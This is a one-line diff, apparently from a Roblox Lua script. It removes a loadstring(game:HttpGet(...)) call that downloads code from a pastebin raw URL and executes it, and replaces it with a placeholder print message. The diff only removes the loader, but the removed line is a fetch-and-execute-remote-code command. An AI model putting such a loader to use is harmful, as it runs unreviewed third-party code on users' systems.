@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/P57Dyk64", true))() 
+print("loadstring is getting changed brb soon!")
